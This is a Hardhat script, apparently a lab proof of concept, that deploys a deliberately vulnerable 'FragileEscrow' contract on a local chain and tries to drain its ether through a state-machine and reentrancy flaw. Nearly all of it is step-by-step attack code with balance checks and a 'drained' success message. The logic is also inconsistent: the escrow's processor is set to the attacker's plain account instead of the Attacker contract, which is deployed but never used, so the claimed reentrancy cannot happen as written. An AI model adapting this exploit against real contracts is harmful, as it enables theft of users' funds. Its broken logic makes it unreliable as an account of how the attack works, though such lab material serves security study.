
const { ethers } = require("hardhat");

async function main() {
  console.log(
    "🚀 Initiating attack on New_StateMachineDependency_Vulnerable..."
  );

  // --- 1. GET THE SIGNERS ---
  const [deployer, attackerSigner] = await ethers.getSigners();
  console.log(`Deployer (Victim) Address: ${deployer.address}`);
  console.log(`Attacker Address: ${attackerSigner.address}`);

  // --- 2. DEPLOY THE CONTRACTS ---
  console.log("\nDeploying contracts...");
  const FragileEscrow = await ethers.getContractFactory("FragileEscrow");
  // The processor is the attacker contract in this case
  const escrow = await FragileEscrow.deploy(attackerSigner.address);
  await escrow.waitForDeployment();
  console.log(`FragileEscrow deployed at: ${escrow.target}`);

  const Attacker = await ethers.getContractFactory("Attacker");
  const attackerContract = await Attacker.deploy(escrow.target);
  await attackerContract.waitForDeployment();
  console.log(`Attacker contract deployed at: ${attackerContract.target}`);

  // --- 3. FUND THE ESCROW ---
  console.log(
    "\nDepositing 10 ETH into the FragileEscrow from the deployer..."
  );
  const depositTx = await escrow.connect(deployer).deposit({
    value: ethers.parseEther("10.0"),
  });
  await depositTx.wait();
  console.log("✅ Deposit successful!");

  // --- 4. EXECUTE THE ATTACK ---
  console.log("\n💰 Checking balances before the attack...");
  const escrowBalanceBefore = await ethers.provider.getBalance(escrow.target);
  const attackerBalanceBefore = await ethers.provider.getBalance(
    attackerSigner.address
  );
  console.log(
    `   - Escrow Balance: ${ethers.formatEther(escrowBalanceBefore)} ETH`
  );
  console.log(
    `   - Attacker Balance: ${ethers.formatEther(attackerBalanceBefore)} ETH`
  );

  console.log("\n💥 ATTACKING: Exploiting the state machine dependency...");
  // Step 1: Attacker deposits 1 ETH into escrow
  console.log("   - Step 1: Attacker deposits into escrow...");
  const attackDepositTx = await escrow
    .connect(attackerSigner)
    .deposit({ value: ethers.parseEther("1.0") });
  await attackDepositTx.wait();
  console.log("   ✅ Attacker's deposit successful!");

  // Step 2: Attacker (as processor) locks their own deposit for processing
  console.log("   - Step 2: Attacker (as processor) locks the deposit...");
  const lockTx = await escrow
    .connect(attackerSigner)
    .lockForProcessing(attackerSigner.address);
  await lockTx.wait();
  console.log("   ✅ Deposit locked!");

  // Step 3: Attacker (as processor) finalizes release, which should trigger reentrancy
  console.log(
    "   - Step 3: Attacker finalizes release (attempting reentrancy)..."
  );
  const releaseTx = await escrow
    .connect(attackerSigner)
    .finalizeRelease(attackerSigner.address);
  await releaseTx.wait();
  console.log("✅ Attack transaction successful!");

  console.log("\n💰 Checking balances after the attack...");
  const escrowBalanceAfter = await ethers.provider.getBalance(escrow.target);
  const attackerBalanceAfter = await ethers.provider.getBalance(
    attackerSigner.address
  );
  console.log(
    `   - Escrow Balance: ${ethers.formatEther(escrowBalanceAfter)} ETH`
  );
  console.log(
    `   - Attacker Balance: ${ethers.formatEther(attackerBalanceAfter)} ETH`
  );

  if (escrowBalanceAfter < ethers.parseEther("1.0")) {
    console.log("\n🎉 SUCCESS: The FragileEscrow has been drained!");
  } else {
    console.log("\n😞 FAILED: The FragileEscrow was not drained.");
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
